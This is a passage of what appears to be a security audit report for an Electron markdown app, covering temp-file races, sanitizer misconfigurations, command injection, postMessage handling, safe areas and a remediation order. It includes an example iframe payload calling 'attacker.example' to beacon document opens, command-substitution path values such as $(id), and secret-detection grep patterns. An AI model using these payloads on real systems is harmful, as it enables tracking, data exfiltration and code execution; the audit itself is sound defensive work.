+const tempHtmlPath = path.join(os.tmpdir(), "omnicore-temp-image.html");     // main.js:1598
+const tempHtmlPath = path.join(os.tmpdir(), "omnicore-temp-table.html");     // main.js:1876
+const batchPath    = path.join(os.tmpdir(), "omnicore-update.bat");          // main.js:2484
+```
+
+**Why it matters.** Fixed, guessable filenames in a shared temp directory. On Linux and macOS `os.tmpdir()` is world-writable `/tmp`, so an unprivileged local user (or another compromised process) can pre-create these paths as symlinks: `fs.writeFileSync` follows symlinks, giving arbitrary file write as the app's user (`main.js:1358`, `1529`, `1817`, `2166`). The window is wide — these files persist until the popup closes.
+
+Worse, the ordering in `main.js:2484-2494` is create-then-execute:
+```js
+fs.writeFileSync(batchPath, batch, "utf8");
+const { exec } = require("child_process");
+exec(`start /min "" cmd /c "${batchPath}"`);
+```
+A local attacker who wins the race between the write and the `exec` gets code execution as the user. This particular one is Windows-only, where `os.tmpdir()` is per-user (`%LOCALAPPDATA%\Temp`), which substantially limits it.
+
+Also note the temp files are only removed on the `closed` event — an app crash leaves attacker-derived HTML on disk.
+
+**Fix.** Use `fs.mkdtempSync(path.join(os.tmpdir(), 'omnicore-'))` for a unique 0700 directory per invocation, and open with `flag: 'wx'` to fail on a pre-existing path.
+
+---
+
+## SEC-21 — `<iframe src>` and inline `style` are explicitly re-enabled in the sanitizer
+
+**Severity: Medium** · Category: SecurityMisconfiguration · Confidence 8/10 · Upstream
+
+**Location:** `renderer.js:3155-3158` and `renderer.js:3028-3031`
+
+```js
+html = DOMPurify.sanitize(html, {
+  ADD_TAGS: ['iframe', 'style'],
+  ADD_ATTR: ['target', 'style', 'class', 'id', 'data-note-id', ...]
+});
+```
+
+**Why it matters.** DOMPurify forbids `iframe` and `style` by default for good reason; both are re-enabled here. I verified `srcdoc` is **not** in DOMPurify's attribute allowlist (grepped `node_modules/dompurify/dist/purify.js` — the only `srcdoc` occurrence is in a comment at line 654), so direct `<iframe srcdoc>` from markdown *is* stripped. But `src` is allowed, so:
+
+```markdown
+<iframe src="https://attacker.example/track?doc=confidential"></iframe>
+```
+
+survives sanitization and loads remote attacker content inside the application, with no CSP to stop it (SEC-09). Consequences: silent read-receipt/beaconing on every document open, remote-controlled phishing UI rendered inside a trusted-looking app window, and the user-gesture `top.location` navigation chain described in SEC-11.
+
+`ADD_TAGS: ['style']` plus `ADD_ATTR: ['style']` additionally permits CSS injection — arbitrary `background-image: url(https://attacker/...)` exfiltration channels and full-window UI redressing over the app chrome.
+
+**Fix.** Drop `iframe` from `ADD_TAGS` (it exists only to support the `@@@html` feature, which should be removed per SEC-01). If `style` must stay, constrain it via DOMPurify hooks or a CSS allowlist.
+
+---
+
+## SEC-22 — Command injection surface in `exec()` on the WSL export path
+
+**Severity: Low** · Category: StringInjection · Confidence 6/10 · Upstream
+
+**Location:** `main.js:541-549`
+
+```js
+function openFileAfterExport(filePath) {
+  if (process.platform === "linux") {
+    exec(`wslpath -w "${filePath}"`, (err, winPath) => {
+      if (!err && winPath && winPath.trim()) {
+        exec(`explorer.exe "${winPath.trim()}"`, (err2) => { ... });
+```
+
+**Why it is only Low.** `filePath` is interpolated into a shell command inside double quotes, where `$`, `` ` `` and `\` remain active — a path containing `` `id` `` or `$(id)` would execute. However `filePath` originates from `dialog.showSaveDialog()` (`main.js:635`, `690`, `1409`, `1544`), so the user must type the malicious path themselves. The `defaultPath` *is* derived from the document filename (`main.js:601-604`, `659-663`), which an attacker can influence, but the user must still accept the dialog, and native save dialogs generally reject shell metacharacters in the filename field. I could not construct a realistic end-to-end attack — reported as a code-quality-adjacent security defect rather than an exploitable bug.
+
+**Fix.** Use `execFile('wslpath', ['-w', filePath])`, which bypasses the shell entirely.
+
+---
+
+## SEC-23 — `postMessage` handler accepts messages from any origin
+
+**Severity: Low** · Category: SecurityMisconfiguration · Confidence 8/10 · Upstream
+
+**Location:** `renderer.js:~3245` (the `omnicore-rawhtml-resize` listener)
+
+```js
+window.addEventListener('message', function(e) {
+  if (!e.data || e.data.type !== 'omnicore-rawhtml-resize') return;
+  const iframe = viewer.querySelector(`iframe[data-rawhtml-idx="${e.data.idx}"]`);
+  if (iframe && e.data.h > 0) iframe.style.height = e.data.h + 'px';
+});
+```
+
+No `e.origin` or `e.source` check. Any frame — including a remote `<iframe src>` admitted by SEC-21 — can post this message. The impact is limited to setting an iframe's CSS height (`e.data.idx` is only used inside an attribute selector, and `e.data.h` is concatenated into a `style.height` property assignment, not into HTML, so neither is an injection sink). Reported for completeness and because it is trivially fixable.
+
+**Fix.** Validate `e.source` against the known iframe's `contentWindow` and coerce `e.data.h` with `Number()`.
+
+---
+
+## SEC-24 — Session persistence re-arms malicious documents on every launch *(fork-introduced)*
+
+**Severity: Low** · Category: SecurityMisconfiguration · Confidence 8/10 · **Fork-specific** (`custom-tabs.js`)
+
+**Location:** `custom-tabs.js:620-623` (save), `custom-tabs.js:629-672` (restore), `custom-tabs.js:111` (re-read from disk)
+
+```js
+localStorage.setItem("openTabs", JSON.stringify(tabsData));       // custom-tabs.js:620
+localStorage.setItem("activeTabPath", activeTab ? activeTab.filePath : "");
+...
+if (window.fs.existsSync(tabData.filePath)) { ... }               // custom-tabs.js:640
+```
+
+This is not a vulnerability on its own — the tab feature is well-implemented and contains no injection sinks. But it changes the risk profile of every finding above: a malicious document opened once is silently reopened and re-rendered on every subsequent launch, converting one-shot payloads into persistence, and re-reading from disk (`custom-tabs.js:111`) means the attacker can swap the file contents between sessions.
+
+Worth noting explicitly in the fork's README once the Critical findings are fixed; not worth fixing in isolation.
+
+**Fix.** Optional: cap restored tabs, or prompt before restoring a session on first launch.
+
+---
+
+## SEC-25 — `marked` `sanitize: false` is a removed, no-op option
+
+**Severity: Info** · Category: SecurityMisconfiguration · Confidence 10/10 · Upstream
+
+**Location:** `renderer.js:33-39`
+
+```js
+marked.setOptions({
+  breaks: true, gfm: true, headerIds: true, mangle: false,
+  sanitize: false
+});
+```
+
+`sanitize` was deprecated in marked v0.7 and **removed in v5**; the app runs marked 9.1.6, so this key is silently ignored. The good news: it is set to `false`, meaning the code is *not* relying on it — DOMPurify is the actual control. Flagged only because a reader (or a future maintainer) may believe a sanitizer setting is in force here when none is. Setting it to `true` would not help either — it would still be ignored.
+
+**Fix.** Delete the dead option and add a comment stating that DOMPurify is the sole sanitization boundary.
+
+---
+
+## SEC-26 — Sanitization is not the last step in the pipeline (root cause)
+
+**Severity: Info (architectural)** · Confidence 10/10 · Upstream
+
+**Location:** `renderer.js:3151-3234` vs `renderer.js:2996-3039`
+
+Worth recording separately because it is the single root cause behind SEC-02, SEC-03 and SEC-04, and because the two render paths **disagree with each other**:
+
+* **Full render** (`renderMarkdownFull`): `DOMPurify.sanitize` at `renderer.js:3155`, then slider/mermaid/omniware/iframe splicing at `3168`, `3193`, `3200`, `3229`, then `patchViewerDOM` at `3234`. → **vulnerable**
+* **Light-format render** (`renderLightFormat`): mermaid splicing at `2996` and iframe splicing at `3016`, **then** `DOMPurify.sanitize` at `3028`, then `patchViewerDOM` at `3039`. → mostly safe (the `srcdoc` attribute is stripped, so `@@@html` renders as an empty iframe)
+
+The correct ordering already exists in the codebase; it is simply not used on the path that matters. Any fix should converge both paths on *parse → assemble → sanitize → insert*.
+
+---
+
+## Coverage: what I checked and found SAFE
+
+Recorded so a reader knows where the audit's boundaries are.
+
+**Mermaid configuration — safe.** `mermaid-config.js:47-56` (`getMermaidConfig`) sets only `startOnLoad`, `theme` and `themeVariables`. **`securityLevel` is never set**, so mermaid 10.x defaults to `'strict'`, which enables mermaid's internal DOMPurify pass on labels and disables click/callback interaction. I grepped the whole repo for `securityLevel` and `'loose'` — no occurrences. The single `mermaid.initialize()` call site is `renderer.js:25-28`. This is genuinely the correct default and is the reason SEC-07 is High rather than Critical.
+
+**`webSecurity` / `allowRunningInsecureContent` — safe.** Neither appears in any `webPreferences` block in `main.js` (grepped). Both retain their secure defaults (`webSecurity: true`, `allowRunningInsecureContent: false`). No `webview` tag is used anywhere; no `BrowserView` is created.
+
+**Table popup window — correctly hardened.** `main.js:1865-1868` sets `nodeIntegration: false, contextIsolation: true`. This is the only popup that does so, and it is why SEC-15 is Medium and contained rather than Critical.
+
+**No hardcoded secrets.** Grepped all `*.js`, `*.json`, `*.yml`, `*.bat`, `*.sh`, `*.md`, `*.html` outside `node_modules`/`libs` for `ghp_`, `github_pat_`, `AKIA`, `-----BEGIN`, and `api_key`/`secret`/`password`/`token` assignment patterns — **zero matches**. `.github/workflows/release.yml` correctly uses `${{ secrets.GITHUB_TOKEN }}`. `.claude/settings.local.json` contains only tool permissions, no credentials.
+
+**Full IPC surface enumerated — no privilege escalation beyond what the renderer already holds.** All 31 handlers reviewed: `main.js:470, 475, 519, 529, 597, 655, 720, 827, 928, 984, 989, 994, 999, 1007, 1022, 1060, 1427, 1435, 1565, 1579, 1827, 1856, 2266, 2430, 2433, 2436, 2444, 2469, 2476`. Several accept renderer-supplied paths with no validation — `save-markdown-file` (`main.js:928`) writes any path, `reload-file` (`main.js:1022`) reads any path, `start-file-watching` (`main.js:984`) and `set-active-file` (`main.js:1007`) watch any path, `open-folder-in-explorer` (`main.js:529`) calls `shell.showItemInFolder` on any path. **This is not an escalation** in the current architecture, because the renderer already has unrestricted `fs` and `shell` via `nodeIntegration: true` (`renderer.js:4-6`). It *does* become a real path-traversal/arbitrary-write vulnerability class the moment SEC-08 is fixed — so path validation must be added **as part of** that refactor, not after it. There is no IPC channel that accepts a shell command or a module name.
+
+**`handleFileArgument` and file associations — safe.** `main.js:2185-2246`: skips `--`-prefixed flags, requires `fs.existsSync(arg)`, and enforces an extension allowlist (`.md .markdown .mdown .mkd .mkdn .mmd .mermaid .ow`). It cannot be coerced into reading an arbitrary path or executing anything. The macOS `open-file` handler (`main.js:2248-2264`) and the `second-instance` handler (`main.js:2318-2352`) route through the renderer's unsaved-changes check. **No custom protocol handler is registered** — no `app.setAsDefaultProtocolClient`, no `protocol.registerSchemesAsPrivileged`, no `protocols` key in the electron-builder config. There is therefore **no deep-link attack surface**, which meaningfully limits remote (as opposed to file-borne) triggering.
+
+**`shell.openExternal` — correctly restricted.** `renderer.js:1376-1381` gates it behind `url.startsWith('http://') || url.startsWith('https://')` on the *resolved absolute* `link.href`, so `javascript:`, `file:`, `smb:`, `ms-msdt:` and other dangerous schemes cannot reach it via this path. DOMPurify independently strips `javascript:` and non-allowlisted schemes from `href`. The other call site (`renderer.js:1316`) is a hardcoded constant. I specifically looked for a scheme-confusion bypass here and did not find one.
+
+**DOMPurify default protections still intact for the tags/attrs not overridden.** Verified against the bundled `node_modules/dompurify/dist/purify.js`: `srcdoc` is not in the attribute allowlist (line 654 is a comment only); `IS_ALLOWED_URI` (the sealed regex) permits only `http(s)`, `ftp(s)`, `mailto`, `tel`, `callto`, `sms`, `cid`, `xmpp`, `matrix` plus scheme-less values — `file:`, `javascript:` and `data:` in `href` are rejected. `<script>`, `<meta>` and `<base>` are not in the default tag allowlist and are not added.
+
+**Note title/content escaping — safe.** `renderer.js:5586-5587` and `renderer.js:2452-2453` correctly escape `<`/`>` before interpolating into element text positions. Only the adjacent `noteId` was missed (SEC-13).
+
+**Table of contents — safe.** `renderer.js:2296` uses `item.textContent = header.textContent`, not `innerHTML`.
+
+**Tab rendering — safe.** `custom-tabs.js:392-394` uses `textContent` for both the tab title and its tooltip. `custom-tabs.js:399` and `custom-tabs.js:582` assign only static SVG/welcome-screen literals. Same for `custom-theme.js:64` and `custom-language.js:221` (static SVG + a label from a hardcoded string table) and `custom-collapse.js:80,91`.
+
+**No `eval` / `new Function` in first-party code.** Grepped all root-level `*.js` — zero matches.
+
+**PrismJS is loaded from disk, not a CDN.** `index.html:30` → `libs/prismjs/prism-bundle.js`. I checked the bundle for a live autoloader base path (`cdnjs`, `jsdelivr`, `languages_path`) — the only URL hits are license headers, comments and documentation links. The `prism-autoloader` component present under `libs/prismjs/components/` is not the file being loaded. This is the pattern the other three libraries should follow (SEC-10).
+
+**`npm audit` clean for the runtime rendering dependencies.** No advisories against `marked`, `mermaid`, `dompurify`, `prismjs`, `html2canvas` or `html-to-docx` as installed. (Caveat: this does **not** cover the older CDN-pinned versions that actually execute — see SEC-16.) The audit command ran successfully against the configured proxy registry; no network failures were encountered and no results are guessed.
+
+**No telemetry or analytics.** No `fetch`, `XMLHttpRequest`, `axios`, or `http.request` to any endpoint in first-party code. The only outbound network activity is the CDN/font loads in `index.html` (SEC-10) and `electron-updater`'s GitHub Releases check (`main.js:2444-2467`), which is gated on `app.isPackaged`.
+
+**Not audited in depth.** The `vscode-extension/` sub-project (~10 TypeScript source files plus a bundled webview under `vscode-extension/media/`) is a separate deliverable with a different threat model (VS Code webviews are sandboxed and CSP-enforced by the host). It is not part of the Electron app's `build.files` list and does not ship in the desktop artifact. I note that `vscode-extension/media/webview/mermaid-config.js` and `omniware-config.js` are copies of the vulnerable root files, so **SEC-04 and the mermaid handling likely reproduce there** — it warrants its own pass before that extension is published.
+
+---
+
+## Recommended remediation order
+
+1. **SEC-26 / SEC-02 / SEC-03 / SEC-04** — make DOMPurify the last step before DOM insertion, and escape the three post-sanitization interpolation sites. Highest value per line changed; kills three zero-click RCEs.
+2. **SEC-01** — remove `@@@html`, or add `sandbox="allow-scripts"` (no `allow-same-origin`).
+3. **SEC-05 / SEC-06 / SEC-07** — escape the popup interpolations and flip those three windows to `nodeIntegration: false`.
+4. **SEC-11 / SEC-09** — add `will-navigate` + `setWindowOpenHandler` guards and a CSP.
+5. **SEC-10 / SEC-16** — move marked/mermaid/DOMPurify to local files and bump versions.
+6. **SEC-12 / SEC-13 / SEC-14 / SEC-15** — the remaining injection and one-click-execution fixes.
+7. **SEC-08** — the `contextIsolation: true` + preload refactor. Largest effort; do it last, but note that until it lands, every other fix is a single missed escape away from RCE. Path validation on the IPC handlers must land together with this.
+8. **SEC-17 / SEC-18 / SEC-19** — dependency and CI hardening.
